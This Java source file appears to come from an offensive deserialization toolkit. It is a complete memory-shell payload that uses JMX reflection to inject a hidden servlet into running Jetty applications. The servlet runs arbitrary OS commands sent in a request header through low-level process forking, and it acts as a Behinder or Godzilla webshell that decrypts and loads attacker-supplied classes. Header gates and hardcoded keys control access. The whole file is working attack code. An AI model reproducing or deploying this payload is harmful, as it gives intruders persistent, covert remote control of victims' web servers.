package org.su18.ysuserial.payloads.templates.memshell.jetty;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import sun.misc.Unsafe;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

/**
 * 使用 JMX 注入 Jetty Servlet 型内存马
 * <p>
 * 访问路径 /su18
 * 前提条件：Referer: https://su18.org/
 * X-SSRF-TOKEN 如果为 ce 则执行命令
 * X-SSRF-TOKEN 如果为 bx 则为冰蝎马   密码 su18yyds
 * X-SSRF-TOKEN 如果为 gz 则为哥斯拉马 pass su18 key su18yyds
 */
public class JSMSFromJMX implements Servlet {

    static {
        try {
            String servletName = "su18" + System.nanoTime();
            String urlPattern  = "/su18";

            JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();

            Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mBeanServer);

            field = obj.getClass().getDeclaredField("repository");
            field.setAccessible(true);
            Field modifier = field.getClass().getDeclaredField("modifiers");
            modifier.setAccessible(true);
            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
            for (NamedObject namedObject : namedObjectSet) {
                try {
                    field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
                    field.setAccessible(true);
                    modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                    Object webAppContext = field.get(namedObject.getObject());

                    field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                    field.setAccessible(true);
                    Object handler = field.get(webAppContext);

                    field = handler.getClass().getDeclaredField("_servlets");
                    field.setAccessible(true);
                    Object[] objects = (Object[]) field.get(handler);

                    boolean flag = false;
                    for (Object o : objects) {
                        field = o.getClass().getSuperclass().getDeclaredField("_name");
                        field.setAccessible(true);
                        String name = (String) field.get(o);
                        if (name.equals(servletName)) {
                            flag = true;
                            break;
                        }
                    }

                    if (!flag) {
                        ClassLoader classLoader = handler.getClass().getClassLoader();
                        Class       sourceClazz = null;
                        Object      holder      = null;
                        try {
                            sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                            field = sourceClazz.getDeclaredField("JAVAX_API");
                            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                            Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
                            holder = method.invoke(handler, field.get(null));
                        } catch (ClassNotFoundException e) {
                            try {
                                sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                            } catch (ClassNotFoundException ignored) {
                                sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Holder$Source");
                            }
                            Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
                            holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                        }

                        holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
                        Servlet servlet = new JSMSFromJMX();
                        holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, servlet);
                        handler.getClass().getMethod("addServlet", holder.getClass()).invoke(handler, holder);

//                    ServletMapping mappingx = new ServletMapping(Source.JAVAX_API);
//                    mappingx.setServletName(ServletHolder.this.getName());
//                    mappingx.setPathSpecs(urlPatterns);
//                    ServletHolder.this.getServletHandler().addServletMapping(mappingx);

                        Class  clazz          = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
                        Object servletMapping = null;
                        try {
                            servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
                        } catch (NoSuchMethodException e) {
                            servletMapping = clazz.newInstance();
                        }

                        servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
                        servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
                        handler.getClass().getMethod("addServletMapping", clazz).invoke(handler, servletMapping);
                    }
                } catch (Exception e) {
                    //pass
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    String xc = "7ff9fe91aaa7d3aa"; // key

    String pass = "su18";

    String md5 = md5(pass + xc);

    Class payload;

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception ignored) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class  base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class  base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws
        ServletException, IOException {
        HttpServletRequest  request  = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        try {
            // 入口
            if (request.getHeader("Referer").equalsIgnoreCase("https://su18.org/")) {
                Object lastRequest  = request;
                Object lastResponse = response;
                // 解决包装类RequestWrapper的问题

                // cmdshell
                if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("ce")) {
                    String cmd = request.getHeader("X-Token-Data");
                    if (cmd != null && !cmd.isEmpty()) {
                        String[] cmds = null;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            cmds = new String[]{"cmd", "/c", cmd};
                        } else {
                            cmds = new String[]{"/bin/bash", "-c", cmd};
                        }

                        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
                        theUnsafeField.setAccessible(true);
                        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

                        Class processClass = null;

                        try {
                            processClass = Class.forName("java.lang.UNIXProcess");
                        } catch (ClassNotFoundException e) {
                            processClass = Class.forName("java.lang.ProcessImpl");
                        }

                        Object processObject = unsafe.allocateInstance(processClass);

                        byte[][] args = new byte[cmds.length - 1][];
                        int      size = args.length;

                        for (int i = 0; i < args.length; i++) {
                            args[i] = cmds[i + 1].getBytes();
                            size += args[i].length;
                        }

                        byte[] argBlock = new byte[size];
                        int    i        = 0;

                        for (byte[] arg : args) {
                            System.arraycopy(arg, 0, argBlock, i, arg.length);
                            i += arg.length + 1;
                        }

                        int[] envc                 = new int[1];
                        int[] std_fds              = new int[]{-1, -1, -1};
                        Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
                        Field helperpathField      = processClass.getDeclaredField("helperpath");
                        launchMechanismField.setAccessible(true);
                        helperpathField.setAccessible(true);
                        Object launchMechanismObject = launchMechanismField.get(processObject);
                        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

                        int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

                        Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
                            byte[].class, int.class, byte[].class, int[].class, boolean.class);

                        forkMethod.setAccessible(true);//

                        forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(cmds[0]), argBlock, args.length,
                            null, envc[0], null, std_fds, false);

                        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
                        initStreamsMethod.setAccessible(true);
                        initStreamsMethod.invoke(processObject, std_fds);

                        Method getInputStreamMethod = processClass.getMethod("getInputStream");
                        getInputStreamMethod.setAccessible(true);
                        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        int                   a    = 0;
                        byte[]                b    = new byte[1024];

                        while ((a = in.read(b)) != -1) {
                            baos.write(b, 0, a);
                        }

                        response.getWriter().println(baos);
                    }
                } else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("bx")) {
                    if (request.getMethod().equals("POST")) {
                        // 创建pageContext
                        HashMap pageContext = new HashMap();

                        HttpSession session = request.getSession();
                        pageContext.put("request", lastRequest);
                        pageContext.put("response", lastResponse);
                        pageContext.put("session", session);
                        // 冰蝎逻辑
                        String k = "7ff9fe91aaa7d3aa";
                        session.putValue("u", k);
                        Cipher c = Cipher.getInstance("AES");
                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        method.setAccessible(true);
                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload.toString()));
                        Class  evilclass      = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                        evilclass.newInstance().equals(pageContext);
                    }
                } else if (request.getHeader("X-SSRF-TOKEN").equalsIgnoreCase("gz")) {
                    // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
                    byte[] data = base64Decode(request.getParameter(pass));
                    data = x(data, false);
                    if (payload == null) {
                        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                        Method         defMethod      = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        defMethod.setAccessible(true);
                        payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
                    } else {
                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                        Object                        f      = payload.newInstance();
                        f.equals(arrOut);
                        f.equals(data);
                        f.equals(request);
                        response.getWriter().write(md5.substring(0, 16));
                        f.toString();
                        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                        response.getWriter().write(md5.substring(16));
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public static byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
            result, 0,
            bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
}
